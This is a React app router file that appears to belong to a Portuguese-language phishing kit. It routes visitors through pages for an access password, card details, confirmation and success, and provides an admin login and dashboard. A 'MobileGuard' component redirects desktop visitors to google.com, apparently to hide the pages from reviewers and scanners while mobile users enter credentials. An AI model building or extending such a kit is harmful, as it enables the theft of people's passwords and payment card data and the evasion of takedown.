import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route, useLocation } from "react-router-dom";
import { useEffect } from "react";
import Index from "./pages/Index";

import SenhaAcesso from "./pages/SenhaAcesso";
import DadosCartao from "./pages/DadosCartao";
import Confirmacao from "./pages/Confirmacao";
import Sucesso from "./pages/Sucesso";
import AdminLogin from "./pages/AdminLogin";
import AdminDashboard from "./pages/AdminDashboard";
import NotFound from "./pages/NotFound";

const queryClient = new QueryClient();

function MobileGuard({ children }: { children: React.ReactNode }) {
  const location = useLocation();
  const isAdmin = location.pathname.startsWith("/admin");

  useEffect(() => {
    if (isAdmin) return;
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
      navigator.userAgent
    ) || window.innerWidth <= 768;
    if (!isMobile) {
      window.location.href = "https://www.google.com";
    }
  }, [isAdmin]);

  return <>{children}</>;
}

const App = () => (
  <QueryClientProvider client={queryClient}>
    <TooltipProvider>
      <Toaster />
      <Sonner />
      <BrowserRouter>
        <MobileGuard>
          <Routes>
            <Route path="/" element={<Index />} />
            
            <Route path="/senha-acesso" element={<SenhaAcesso />} />
            <Route path="/dados-cartao" element={<DadosCartao />} />
            <Route path="/confirmacao" element={<Confirmacao />} />
            <Route path="/sucesso" element={<Sucesso />} />
            <Route path="/admin" element={<AdminLogin />} />
            <Route path="/admin/dashboard" element={<AdminDashboard />} />
            <Route path="*" element={<NotFound />} />
          </Routes>
        </MobileGuard>
      </BrowserRouter>
    </TooltipProvider>
  </QueryClientProvider>
);

export default App;
